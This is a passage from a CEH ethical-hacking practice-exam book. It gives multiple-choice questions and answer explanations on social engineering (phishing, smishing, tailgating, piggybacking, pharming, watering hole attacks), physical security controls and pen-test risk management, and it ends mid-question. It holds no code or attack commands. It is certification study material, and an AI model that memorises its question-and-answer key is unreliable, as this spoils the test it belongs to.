than just a phone number.

5. A pen test member has gained access to a building and is observing activity as he wanders
around. In one room of the building, he stands just outside a cubicle wall opening and
watches the onscreen activity of a user. Which social engineering attack is in use here?

A. Eavesdropping

B. Tailgating

C. Shoulder surfing

D. Piggybacking

☑ C. This one is so easy I hope you maintain your composure and stifle the urge to
whoop and yell in the test room. Shoulder surfing doesn’t necessarily require you to
actually be on the victim’s shoulder—you just have to be able to watch their onscreen
activity. I once shoulder surfed in front of someone (a mirror behind her showed her
screen clear as day). You don’t even really need to be close to the victim—there are
plenty of optics that can zoom in a field of vision from a very long distance away.
As an aside, in the real world, if you are close enough to see someone’s screen, you’re
probably close enough to listen to them as well. EC-Council puts the emphasis of
shoulder surfing on the visual aspect—eavesdropping would be auditory.

☐✗ A is incorrect because eavesdropping is a social engineering method where the attacker
simply remains close enough to targets to overhear conversations. Although it’s
doubtful users will stand around shouting passwords at each other, you’d be surprised
how much useful information can be gleaned by just listening in on conversations.

☐✗ B is incorrect because tailgating is a method for gaining entrance to a facility by
flashing a fake badge and following an authorized user through an open door.

☐✗ D is incorrect because piggybacking is another method to gain entrance to a facility.
In this effort, though, you don’t have a badge at all; you just follow people through
the door.

Chapter 12: Low Tech: Social Engineering and Physical Security

291

12-ch12.indd 291 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

6. A recent incident investigated by the local IR team involved a user receiving an e-mail
that appeared to be from the U.S. Postal Service, notifying her of a package headed her
way and providing a link for tracking the package. The link provided took the user to
what appeared to be the USPS site, where she input her user information to learn about
the latest shipment being delivered. Which attack did the user fall victim to?

A. Phishing

B. Internet level

C. Reverse social engineering

D. Impersonation

☑ A. Phishing is one of the most pervasive and effective social engineering attacks on
the planet. It’s successful because crafting a legitimate-looking e-mail that links a user
to an illegitimate site or malware package is easy to do. What’s more, the e-mail is
easy to spread, and it preys on our human nature to trust. If the source of the e-mail
looks legitimate or the layout looks legitimate, most people will click away without
even thinking about it. Phishing e-mails can often include pictures lifted directly off
the legitimate website and use creative means of spelling that aren’t easy to spot: www
.regions.com is a legitimate bank website that could be spelled in a phishing e-mail as
www.regi0ns.com.

When it comes to real-world use of phishing by ethical hackers and pen testers,
there are a couple items of note: First, phishing has an extreme liability aspect to it
when spoofing a legitimate business. If you’re pen testing an organization and phish
using a variant of a real business name, you could be opening yourself up to some
serious costs: the first time someone calls the real Regions bank to complain is the
moment that the attacker just became liable for the costs associated with the attack.
Second is the risk involved with people simply forwarding your phishing attempt
to recipients you never intended, allowing it to take on a life of its own. In short,
the pen tester will certainly limit the bait (malware or website link embedded in
the phishing attempt), but they will have no control over what a user decides to do
with the e-mail. Suppose the pen tester doesn’t know the exact IP range or makes a
simple mistake in the configuration of the malware, and a user sends it home. Or
to a banking friend. Or to the FBI. Or to a friend who works on a DoD system.
Now you’ve not only hooked the wrong fish but maybe infected something in the
government. That’s nothing to joke about, and it may be a lot worse than a simple
mistake. The bottom line is, in the real world, phishing is dangerous if not planned
and implemented almost perfectly, and pen test teams need to use extreme caution
in implementing it.

☐✗ B is incorrect because Internet level is not a recognized form of social engineering
attack by this exam. It’s included here as a distractor.

☐✗ C is incorrect because reverse social engineering is an attack where the attacker cons the
target into calling back with useful information.

CEH Certified Ethical Hacker Practice Exams

292

12-ch12.indd 292 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☐✗ D is incorrect because this particular description does not cover impersonation.
Impersonation is an attack where a social engineer pretends to be an employee, a
valid user, or even an executive (or other VIP). Generally speaking, when it comes
to the exam, any impersonation question will revolve around an in-person visit or a
telephone call.

7. Which type of social engineering attack uses phishing, pop-ups, and IRC channels?

A. Technical

B. Computer based

C. Human based

D. Physical

☑ B. All social engineering attacks fall into one of two categories: human based or
computer based. Computer-based attacks are those carried out with the use of a
computer or other data-processing device. Some examples are fake pop-up windows,
SMS texts, e-mails, and chat rooms or services. Social media sites (such as Facebook
and LinkedIn) are consistent examples as well, and spoofing entire websites isn’t out
of the realm of possibility here either.

☐✗ A is incorrect because technical is not a social engineering attack type and is included
here as a distractor.

☐✗ C is incorrect because human-based social engineering involves the art of human
interaction for information gathering. Human-based social engineering uses interaction
in conversation or other circumstances between people to gather useful information.

☐✗ D is incorrect because physical is not a social engineering attack type and is included
here as a distractor.

8. An attacker identifies a potential target and spends some time profiling her. After gaining
some information, the attacker sends a text to the target’s cell phone. The text appears
to be from the user’s bank and advises her to call a provided phone number immediately
regarding her account information. She dials the number and provides sensitive
information to the attacker, who is posing as a bank employee. Which of the following best
defines this attack?

A. Vishing

B. Smishing

C. Phishing

D. Tishing

☑ B. Aren’t you excited to have another memorization term added to your CEH
vocabulary? In smishing (for SMS text-based phishing), the attacker sends SMS text
messages crafted to appear as legitimate security notifications, with a phone number
provided. The user unwittingly calls the number and provides sensitive data in response.

Chapter 12: Low Tech: Social Engineering and Physical Security

293

12-ch12.indd 293 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☐✗ A is incorrect because vishing is an attack using a phone call or voice message. In vishing,
the attacker calls the target or leaves a voicemail with instructions to follow.

☐✗ C is incorrect because phishing makes use of specially crafted e-mails to elicit responses
and actions.

☐✗ D is incorrect because this term does not exist.

9. Which of the following constitutes the highest risk to the organization?

A. Black-hat hacker

B. White-hat hacker

C. Gray-hat hacker

D. Disgruntled employee

☑ D. When we consider security measures, most of our attention is usually aimed
outside the company, because that’s where all the bad guys are, right? Unfortunately,
this line of thinking leads to all sorts of exposure, for many reasons, and it’s more
common than you might think. A disgruntled employee is still an employee, after all,
which leads to the main reason they’re so dangerous: location. They are already inside
the network. Inside attacks are generally easier to launch, are more successful, and are
harder to prevent. When you add the human element of having an axe to grind, this
can boil over quickly—whether or not the employee has the technical knowledge to
pull off the attack. The idea that someone wanting to do harm to our organization’s
network not only already has the access to do so but has it because we gave it to them
and we’re not watching them should be frightening to us all.

☐✗ A is incorrect because black-hat hackers aren’t necessarily already inside the network.
They have a lot of work to do in getting access and a lot of security levels to wade
through to do it.

☐✗ B is incorrect because a white-hat hacker is one of the good guys—an ethical hacker,
hired for a specific purpose.

☐✗ C is incorrect because a gray-hat hacker falls somewhere between white and black.
They may be hacking without express consent, but doing so with good intentions
(not that good intentions will keep one out of jail). Supposedly they’re not hacking
for personal gain; they just don’t bother to get permission and occasionally dance on
the dark side of legality.

10. After observing a target organization for several days, you discover that finance and HR
records are bagged up and placed in an outside storage bin for later shredding/recycling.
One day you simply walk to the bin and place one of the bags in your vehicle, with plans
to rifle through it later. Which social engineering attack was used here?

A. Offline

B. Physical

C. Piggybacking

D. Dumpster diving

CEH Certified Ethical Hacker Practice Exams

294

12-ch12.indd 294 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☑ D. Dumpster diving doesn’t necessarily mean you’re actually taking a header into a
dumpster outside. It could be any waste canister, in any location, and you don’t even
have to place any more of your body in the canister than you need to extract the old
paperwork with. And you’d be amazed what people just throw away without thinking
about it: password lists, network diagrams, employee name and number listings, and
financial documents are all examples. Lastly, don’t forget that EC-Council defines
this as a passive activity. Sure, in the real world, you run a real risk of discovery
and questioning by any number of the organization’s staff, but on your exam it’s
considered passive.

☐✗ A is incorrect because offline is not a social engineering attack and is used here as a
distractor.

☐✗ B is incorrect because physical is not a social engineering attack type.

☐✗ C is incorrect because piggybacking is a social engineering attack that allows entry into
a facility and has nothing to do with digging through trash for information.

11. An attacker waits outside the entry to a secured facility. After a few minutes an authorized
user appears with an entry badge displayed. He swipes a key card and unlocks the door.
The attacker, with no display badge, follows him inside. Which social engineering attack
just occurred?

A. Tailgating

B. Piggybacking

C. Identity theft

D. Impersonation

☑ B. This is one of those questions that just drives everyone batty—especially people
who actually perform pen tests for a living. Does knowing that gaining entry without
flashing a fake ID badge of any kind is called piggybacking make it any easier or
harder to pull off? I submit having two terms for what is essentially the same attack,
separated by one small detail, is a bit unfair, but there’s not a whole lot we can do
about it. If it makes it easier to memorize, just keep in mind that pigs wouldn’t wear a
badge—they don’t have any clothes to attach it to.

☐✗ A is incorrect because a tailgating attack requires the attacker to be holding a fake
badge of some sort. I know it’s silly, but that’s the only differentiation between these
two items: tailgaters have badges, piggybackers do not. If it makes it any easier, just
keep in mind a lot of tailgaters at a football game should have a badge on them—to
prove they are of legal drinking age.

☐✗ C is incorrect because this attack has nothing to do with identity theft. Identity theft
occurs when an attacker uses personal information gained on an individual to assume
that person’s identity. Although this is normally thought of in the context of the
criminal world (stealing credit cards, money, and so on), it has its uses elsewhere.

☐✗ D is incorrect because impersonation is not in play here. The attacker isn’t pretending
to be anyone else at all—he’s just following someone through an open door.

Chapter 12: Low Tech: Social Engineering and Physical Security

295

12-ch12.indd 295 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

12. Tim is part of a pen test team and is attempting to gain access to a secured area of
the campus. He stands outside a badged entry gate and pretends to be engaged in a
contentious cell phone conversation. An organization employee walks past and badges
the gate open. Tim asks the employee to hold the gate while flashing a fake ID badge
and continuing his phone conversation. He then follows the employee through the gate.
Which of the following best defines this effort?

A. Shoulder surfing

B. Piggybacking

C. Tailgating

D. Drafting

☑ C. This type of question is so annoying I added it twice, back to back, in this
chapter—almost as if I was nearly certain you’ll see it on your exam. Tailgating
involves following someone through an open door or gate just like piggybacking does;
however, in tailgating, a fake identification badge of some sort is used. As an aside, if
your exam question does not include both terms—tailgating and piggybacking—but
the effort is the same (an attacker following a badged employee through a gate or
door), you won’t have to choose between them. Usually, in this case, tailgating will be
used more frequently than piggybacking.

☐✗ A is incorrect because shoulder surfing isn’t about following someone anywhere;
instead, it’s about positioning yourself in such a way as to be able to observe the
keystrokes and activities of someone at their system.

☐✗ B is incorrect because piggybacking does not involve the use of a badge or
identification of any sort.

☐✗ D is incorrect because drafting is a cool term used in NASCAR, but it has nothing to
do with physical pen testing.

13. Which of the following may be effective countermeasures against social engineering?
(Choose all that apply.)

A. Security policies

B. Operational guidelines

C. Appropriately configured IDS

D. User education and training

E. Strong firewall configuration

☑ A, B, D. ECC identifies several countermeasures against social engineering, but
in the real world, none of them (by themselves or grouped) is really the key. The
problem with most countermeasures against social engineering is they’re almost
totally out of your control. Sure, you can draft strong policy requiring users to
comply with security measures, implement guidelines on everything imaginable to
reduce risks and streamline efficiency, and hold educational briefings and training
sessions for each and every user in your organization, but when it comes down to it,

CEH Certified Ethical Hacker Practice Exams

296

12-ch12.indd 296 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

it’s the user who has to do the right thing. All countermeasures for social engineering
have something to do with the users themselves because they are the weak link here.

☐✗ C and E are both incorrect for the same reason: a social engineering attack doesn’t
target the network or its defenses; instead, it targets the users. Many a strongly
defended network has been compromised because a user inside was charmed by a
successful social engineer.

14. Which of the following are indicators of a phishing e-mail? (Choose all that apply.)

A. It does not reference you by name.

B. It contains misspelled words or grammatical errors.

C. It contains spoofed links.

D. It comes from an unverified source.

☑ A, B, C, D. One of the objectives EC-Council has kept around in its many CEH
versions is, and I quote, to “understand phishing attacks.” Part of the official
curriculum to study for the exam covers detecting phishing e-mail in depth,
and all of these answers are indicators an e-mail might not be legitimate. First,
most companies now sending e-mail to customers will reference you by name
and sometimes by account number. An e-mail starting with “Dear Customer” or
something to that effect may be an indicator something is amiss.

Misspellings and grammatical errors from a business are also usually dead giveaways
because companies do their best to proofread items before they are released. There
are, occasionally, some slipups (Internet search some of these; they’re truly funny),
but those are definitely the exception and not the rule.

Spoofed links can be found by hovering a mouse over them (or by looking at their
properties). The link text may read www.yourbank.com, but the hyperlink properties
will be sending you to some IP address you don’t want to go to.

And finally, any e-mail coming from an “unverified source” can and should be viewed
with caution. What makes something an unverified source? That depends on the eye
of the beholder. In many cases, it’s simply an address (or person) you don’t know or
haven’t seen before. In others it’s a very close representation of an e-mail address you’d
recognize, but turns out to be malicious.

In any of these cases, your best bet for personal and organizational security is this:
Don’t Click It. It shouldn’t matter to you who the e-mail is from, whether it’s
grammatically perfect, and the links look legitimate—just put yourself in the habit of
not clicking links in e-mail at all. Trust me, you and your organization will be safer.

As an aside, while these are all great answers to a question on an exam, don’t let
them dictate your day-to-day Internet life outside of your exam. A perfectly written,
grammatically correct e-mail containing real links and originating from someone
you trust could still be part of a phishing campaign. Never click a link in an e-mail
without knowing exactly what it is and where it’s taking you—no matter who you
think the message is from or how well written it is. Finally, if you get a phishing

Chapter 12: Low Tech: Social Engineering and Physical Security

297

12-ch12.indd 297 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

e-mail that is accurate, references you by name, has real links, and truly appears to
be accurate, you probably have a real problem on your hands. Everyone gets the
annoying “spam” e-mails with “Click here for free stuff.” However, if you get one that
is delivered to you, with your name and identifying details in it, you have someone
who spent the time to target you specifically, not randomly.

15. You are discussing physical security measures and are covering background checks on
employees and policies regarding key management and storage. Which type of physical
security measures are being discussed?

A. Physical

B. Technical

C. Operational

D. Practical

☑ C. Physical security has three major facets: physical measures, technical measures,
and operational measures. Operational measures (sometimes referred to as procedural
controls) are the policies and procedures you put into place to assist with security.
Background checks on employees and any kind of written policy for operational
behaviors are prime examples.

☐✗ A is incorrect because physical measures can be seen or touched. Examples include
guards (although you’d probably want to be careful touching one of them), fences,
and locked doors.

☐✗ B is incorrect because technical measures include authentication systems (biometrics
anyone?) and specific permissions you assign to resources.

☐✗ D is incorrect because, although these may seem like practical measures to put into
place, there is simply no category named as such. It’s included here as a distractor,
nothing more.

16. Which of the following resources can assist in combating phishing in your organization?
(Choose all that apply.)

A. Phishkill

B. Netcraft

C. Phishtank

D. IDA Pro

☑ B, C. For obvious reasons, there are not a lot of questions from these objectives
concerning tools—mainly because social engineering is all about the human side of
things, not necessarily using technology or tools. However, you can put into place
more than a few protective applications to help stem the tide. There are innumerable
e-mail-filtering applications and appliances you can put on an e-mail network
boundary to cut down on the vast amount of traffic (spam or otherwise) headed
to your network. Additionally, Netcraft’s phishing toolbar and Phishtank are two

CEH Certified Ethical Hacker Practice Exams

298

12-ch12.indd 298 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

client-side, host-based options you can use (there are others, but these are pointed out
specifically in EC-Council’s official courseware).

Netcraft’s (http://toolbar.netcraft.com/) and Phishtank’s (www.phishtank.com/) toolbars
are like neighborhood watches on virtual steroids, where eagle-eyed neighbors can
see suspicious traffic and alert everyone else. The following is from the Netcraft
site: “Once the first recipients of a phishing mail have reported the target URL, it is
blocked for community members as they subsequently access the URL.”

These tools, although useful, are not designed to completely protect against phishing.
Much like antivirus software, they will act on attempts that match a signature file.
This, sometimes, makes it even easier on the attacker—because they know which
phishing will not work right off the bat.

☐✗ A is incorrect because Phishkill is not an anti-phishing application.

☐✗ D is incorrect because IDA Pro is a debugger tool you can use to analyze malware
(viruses).

17. An attacker targets a specific group inside the organization. After some time profiling
the group, she notes several websites the individual members of the group all visit on a
regular basis. She spends time inserting various malware and malicious code into some of
the more susceptible websites. Within a matter of days, one of the group member’s system
installs the malware from an infected site, and the attacker uses the infected machine as a
pivot point inside the network. Which of the following best defines this attack?

A. Spear phishing

B. Whaling

C. Web-ishing

D. Watering hole attack

☑ D. Have you ever watched nature documentaries on the Discovery Channel? It
seems predators frequently hang out in places where the prey tends to show up. For
example, a pride of lions might just hang out near a watering hole—knowing full
well their prey will eventually just come to them. This attack uses the same principle,
except we’re talking about the virtual world. And none of us are lions (at least not
outside our imaginations, anyway).

In a watering hole attack, the bad guy spends a lot of time profiling the group that
is being targeted (note the key wording in this is that a group is targeted, not an
individual). The attacker can observe or even guess websites the group would visit,
and then infect those sites with some sort of malware or malicious code. Eventually,
someone from the group will visit the virtual watering hole and—voilà—success.

☐✗ A is incorrect because spear phishing involves phishing (sending specially crafted
e-mails that include links to malicious code) targeted at a specific group of people. In
this question, no phishing was involved.

Chapter 12: Low Tech: Social Engineering and Physical Security

299

12-ch12.indd 299 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☐✗ B is incorrect because whaling is a special type of spear phishing targeting high-level
employees.

☐✗ C is incorrect because this is not a valid term.

18. Which type of social engineering makes use of impersonation, dumpster diving, shoulder
surfing, and tailgating?

A. Physical

B. Technical

C. Human based

D. Computer based

☑ C. Once again, we’re back to the two major forms of social engineering: human based
and computer based. Human-based attacks include all the attacks mentioned here
and a few more. Human-based social engineering uses interaction in conversation
or other circumstances between people to gather useful information. This can
be as blatant as simply asking someone for their password or pretending to be a
known entity (authorized user, tech support, or company executive) in order to gain
information.

☐✗ A is incorrect because social engineering attacks do not fall into a physical category.

☐✗ B is incorrect because social engineering attacks do not fall into a technical category.

☐✗ D is incorrect because computer-based social engineering attacks are carried out
with the use of a computer or other data-processing device. These attacks can include
everything from specially crafted pop-up windows for tricking the user into clicking
through to a fake website, to SMS texts that provide false technical support messages
and dial-in information to a user.

19. In examining the About Us link in the menu of a target organization’s website, an
attacker discovers several different individual contacts within the company. To one of
these contacts, she crafts an e-mail asking for information that appears to come from
an individual within the company who would be expected to make such a request.
The e-mail provides a link to click, which then prompts for the contact’s user ID and
password. Which of the following best describes this attack?

A. Trojan e-mailing

B. Spear phishing

C. Social networking

D. Operational engineering

☑ B. Yes, sometimes you’ll get an easy one. Phishing is using e-mail to accomplish the
social engineering task. Spear phishing is actually targeting those e-mails to specific
individuals or groups within an organization. This usually has a much higher success
rate than just a blind-fire phishing effort.

CEH Certified Ethical Hacker Practice Exams

300

12-ch12.indd 300 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☐✗ A, C, and D are incorrect because they are all added as distractors and do not
match the circumstances listed. Trojan e-mailing and operational engineering aren’t
valid terms in regard to social engineering attacks. A social networking attack, per
EC-Council, is one that involves using Facebook, LinkedIn, Twitter, or some other
social media to elicit information or credentials from a target.

20. A security admin has a control in place that embeds a unique image into e-mails on
specific topics in order to verify the message as authentic and trusted. Which anti-phishing
method is being used?

A. Steganography

B. Sign-in seal

C. PKI

D. CAPTCHA

☑ B. Sign-in seal is an e-mail protection method in use at a variety of business locations.
The practice is to use a secret message or image that can be referenced on any official
communication with the site. If you receive an e-mail purportedly from the business
but it does not include the image or message, you’re aware it’s probably a phishing
attempt. This sign-in seal is kept locally on your computer, so the theory is that no
one can copy or spoof it.

☐✗ A is incorrect because steganography is not used for this purpose. As you know,
steganography is a method of hiding information inside another file—usually an
image file.

☐✗ C is incorrect because PKI refers to an encryption system using public and private
keys for security of information between members of an organization.

☐✗ D is incorrect because a CAPTCHA is an authentication test of sorts, which I am sure
you’ve seen hundreds of times already. CAPTCHA (actually an acronym meaning
Completely Automated Public Turing test to tell Computers and Humans Apart)
is a type of challenge–response method where an image is shown, and the client is
required to type the word from the image into a challenge box. An example is on a
contest entry form—you type in your information at the top and then see an image
with a word (or two) in a crazy font at the bottom. If you type the correct word in, it’s
somewhat reasonable for the page to assume you’re a human (as opposed to a script),
and the request is sent forward.

21. Which of the following should be in place to assist as a social engineering
countermeasure? (Choose all that apply.)

A. Classification of information

B. Strong security policy

C. User education

D. Strong change management process

Chapter 12: Low Tech: Social Engineering and Physical Security

301

12-ch12.indd 301 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☑ A, B, C, D. All of the answers are correct, but let’s get this out of the way up front:
you’ll never be able to put anything whatsoever into place that will effectively render
all social engineering attacks moot. You can do some things to limit them, and those
on this list can definitely help in that regard, but an organization that responds to
social engineering concerns with “We have a strong security policy and great user
education” is probably one that’ll see a high turnover rate.

Classification of information is seen as a strong countermeasure because the
information—and access to it—is stored and processed according to strict definitions
of sensitivity. In the government/DoD world, you’d see labels such as Confidential,
Secret, and Top Secret. In the commercial world, you might see Public, Sensitive, and
Confidential. I could write an entire chapter on the difference between DoD and
commercial labels and argue the finer points of various access control methods, but
we’ll stick just to this chapter and what you need here. As a side note, classification
of information won’t do you a bit of good if the enforcement of access to that
information, and the protection of it in storage or transit, is lax.

Strong security policy has been covered earlier in the chapter, so I won’t waste much
print space here on it. You must have a good one in place to help prevent a variety of
security failures; however, you can’t rely on it as a countermeasure on its own.

According to EC-Council, user education is not only a viable social engineering
countermeasure but it’s the best measure you can take. Anyone reading this book
who has spent any time at all trying to educate users on a production, enterprise-
level network is probably yelling right now because results can sometimes be spotty
at best. However, the weak point in the chain is the user, so we must do our best to
educate users on what to look for and what to do when they see it. There simply is no
better defense than a well-educated user (and by “well-educated” I mean a user who
absolutely refuses to participate in a social engineering attempt). There’s just not that
many of them out there.

A change management process helps to organize alterations to a system or
organization by providing a standardized, reviewable process to any major change.
In other words, if you allow changes to your financial system, IT services, or HR
processes without any review or control process, you’re basically opening Pandora’s
box. Change can be made on a whim (sometimes at the behest of a social engineer,
maybe?), and there’s no control or tracking of it.

22. Joe uses a user ID and password to log in to the system every day. Jill uses a PIV card and
a PIN. Which of the following statements is true?

A. Joe and Jill are using single-factor authentication.

B. Joe and Jill are using two-factor authentication.

C. Joe is using two-factor authentication.

D. Jill is using two-factor authentication.

CEH Certified Ethical Hacker Practice Exams

302

12-ch12.indd 302 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☑ D. When it comes to authentication systems, you can use three factors to prove your
identity: something you know, something you have, and something you are. An item
you know is, basically, a password or PIN. Something you have is a physical token of
some sort—usually a smartcard—that is presented as part of the authentication process.
Something you are relates to biometrics—a fingerprint or retinal scan, for instance.
Generally speaking, the more factors you have in place, the better (more secure) the
authentication system. In this example, Joe is using only something he knows, whereas
Jill is using something she has (PIV card) and something she knows (PIN).

☐✗ A is incorrect because Jill is using two-factor authentication.

☐✗ B is incorrect because Joe is using single-factor authentication.

☐✗ C is incorrect because Joe is using single-factor authentication.

23. A system owner has implemented a retinal scanner at the entryway to the data floor.
Which type of physical security measure is this?

A. Technical

B. Single factor

C. Computer based

D. Operational

☑ A. Physical security measures are characterized as physical (door locks and guards),
operational (policies and procedures), and technical (authentications systems and
permissions). This example falls into the technical security measure category. Sure,
the door itself is physical, but the question centers on the biometric system, which is
clearly technical in origin.

☐✗ B is incorrect because single factor refers to the method the authentication system
uses, not the physical security measure itself. In this case, the authentication is using
the “something you are” factor—a biometric retinal scan.

☐✗ C is incorrect because computer based refers to a social engineering attack type, not a
physical security measure.

☐✗ D is incorrect because an operational physical security measure deals with policy and
procedure.

24. Which of the following is the best representation of a technical control?

A. Air conditioning

B. Security tokens

C. Automated humidity control

D. Fire alarms

E. Security policy

Chapter 12: Low Tech: Social Engineering and Physical Security

303

12-ch12.indd 303 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☑ B. All security controls are put into place to minimize, or to avoid altogether, the
probability of a successful exploitation of a risk or vulnerability. Logical controls
(logical is the other term used for technical ) do this through technical, system-
driven means. Examples include security tokens, authentication mechanisms, and
antivirus software.

☐✗ A, C, D, and E are incorrect because they are not logical (technical) controls. Air
conditioning, fire alarms, and a humidity control fall under physical controls. A policy
would fall under procedural controls.

25. Which of the following best describes pharming?

A. An attacker redirects victims to a malicious website by sending an e-mail that provides
a URL that appears to be legitimate.

B. An attacker redirects victims to a malicious website by modifying their host
configuration file or by exploiting vulnerabilities in DNS.

C. An attacker targets specific members of an organization based on their duties, roles,
or responsibilities.

D. An attacker inserts malicious code and malware into sites employees visit on a
regular basis.

☑ B. I’m convinced there are folks who sit around doing nothing more than dreaming
up new terminology, acronyms, and slang for all of us to remember, and pharming
falls into this category. Pharming has the same end goal as most other attacks—
redirecting folks to malicious websites in hopes of stealing something from them.
The method in which it’s done involves updating hosts files and manipulating DNS
to point them to a malicious site.

☐✗ A is incorrect because this describes phishing.

☐✗ C is incorrect because this describes spear phishing (and/or whaling, depending on
the group being targeted).

☐✗ D is incorrect because this describes a watering hole attack.

CEH Certified Ethical Hacker Practice Exams

304

12-ch12.indd 304 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

CHAPTER

The Pen Test: 13
Putting It All Together
This chapter includes questions from the following topics:

• Describe penetration testing, security assessments, and risk management
• Define automatic and manual testing
• List pen test methodology and deliverables

I’ve been exceedingly blessed in my life, in a great many ways I don’t have the time or print space
here to cover. I have had opportunities to travel the world and experience things many people
just flat out don’t get to. In one of my travels I wound up in Florence, Italy, and decided to go
see the statue of David. Even if you’re not familiar with the background of this sculpture, I’ll bet
you’ve seen a replica of it somewhere—from garden art re-creations and store displays to one very
cool episode of SpongeBob SquarePants, where he had to “BE the marble!” David was carved by
Michelangelo sometime between 1501 and 1504 and is universally acclaimed as one of the greatest
sculptures of all time. The statue now sits in a domed atrium within the Galleria dell’Accademia
in Florence. Seeing this work of art, displayed in all its glory in a perfect setting within a beautiful
gallery, is truly an unbelievable experience and is definitely a highlight of any visit to Florence.

What made as big an impression on me, though, were the other, unfinished works of art from
Michelangelo you had to pass by in order to get to the statue of David. There’s a giant hallway
leading to the atrium that is literally packed, on the right and left, with sculptures he started
but, for whatever reason, never finished. Walking down the hallway (at least in your imagination
anyway), we’re surrounded by stonework that is simply amazing. Here, on the right, is a giant
marble stone with half a man sticking out of the left side and chisel marks leading downward to
something as yet unfinished. On the left we see the front half of a horse exploding out of a rough-
hewn block of granite; the rest of the beautiful animal still buried in the story Michelangelo never
got to finish telling with the sculpture. Traveling down this long hallway, we see other works—a
battle raging in one boulder, a face clearly defined and nearly expressionless looking out of a little,
almost leftover piece of rock—all displayed left and right for us to gape at.

These unfinished works weren’t crude by any means; quite the opposite. I stood there among
the crowds racing to get a glimpse of monumental talent, marveling at how a man could take a
big chunk of rock and shape and smooth it into something that looked so real. But these pieces
weren’t finished, and it showed. There were giant scratch marks over areas that should have been
smooth, and a few sculptures simply broke off because the rock itself cracked in two.

305

13-ch13.indd 305 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

What has this got to do with this book, you may be asking? The answer is that we’ve all put
a lot of work into this. We’ve chipped away at giant boulders of knowledge and are on the verge
of finishing. No, I’m not making some crazed corollary to this book being some work of art (as
anyone who really knows me can attest, that’s not my bag, baby), but I am saying we, you and
I, are on the verge of something good here. Keep hacking away at that stone. Keep sanding and
polishing. Sooner or later you’ll finish and have your statue to display—just don’t forget all the
work you put into it, and don’t throw any of it away. I promise, you’ll want to go back, sometime
later, and walk through your own hallway of work to see how far you’ve come.

The questions and answers in this chapter are easier (if memorizing terms is easy for you, that
is), and the explanations of what’s correct and what’s incorrect will reflect that as well. Sure, I
might sneak in a question from earlier in the book—just to see if you’re paying attention, and to
wrap up terms EC-Council throws into this section—but these questions are all supposed to be
about the pen test itself. We’ve already covered the nuts and bolts, so now we’re going to spend
some time on the finished product. And, of course, you will see most of this material on your
exam. I just hope you’ll be so ready for it by then it’ll be like Michelangelo wiping the dust off his
last polishing of the statue of David.

STUDY TIPS This chapter is, by design, a little bit of a wrap-up. There are
things here that just don’t seem to fit elsewhere, or that needed special
attention, away from the clutter of the original EC-Council chapter they were
stuck in. Most of this generally boils down to basic memorization. While that

may sound easy enough to you, I think you’ll find that some of these terms are so closely
related that questions on the exam referencing them will be confusing at the very least—
and most likely rage-inducing by the time the exam ends. Pay close attention to risk
management terminology—you’ll definitely see a few questions on it in your exam.
Another area you’ll probably see at least a couple questions on is the ethics of being a
professional, ethical hacker. Admittedly, some of these will be tough to answer, as real-
world and EC-Council CEH definitions don’t always coincide, but hopefully you’ll find
enough information here to get you through.

Lastly, as I’ve said before, it’s sometimes easier to eliminate wrong answers than it is
to choose the correct one. When you’re looking at one of these questions that seems
totally out of left field, spend your time eliminating the choices you know aren’t correct.
Eventually all that’s left must be the correct answer. After all, the mechanism scoring the
test doesn’t care how you got to the answer, only that the right one is chosen.

CEH Certified Ethical Hacker Practice Exams

306

13-ch13.indd 306 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

QUESTIONS

1. Incident response (IR) is an important part of organizational security. In what step of the Q
incident-handling process would IR team members disable or delete user accounts and
change firewall rules?

A. Detection and analysis

B. Classification and prioritization

C. Containment

D. Forensic investigation

2. A software company puts an application through stringent testing and, on the date of
release, is confident the software is free of known vulnerabilities. An organization named
BigBiz purchases the software at a premium cost, with a guarantee of service, maintenance,
and liability. Which risk management method is in use by the BigBiz organization?

A. Accept

B. Transfer

C. Avoid

D. Mitigate

3. Which of the following provide automated pen-test-like results for an organization?
(Choose all that apply.)

A. Metasploit

B. Nessus

C. Core Impact

D. CANVAS

E. SAINT

F. GFI LanGuard

4. Which of the following best describes an assessment against a network segment that tests
for existing vulnerabilities but does not attempt to exploit any of them?

A. Penetration test

B. Partial penetration test

C. Vulnerability assessment

D. Security audit

Chapter 13: The Pen Test: Putting It All Together

307

13-ch13.indd 307 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

5. You are a member of a pen test team conducting tests. Your team has all necessary scope,
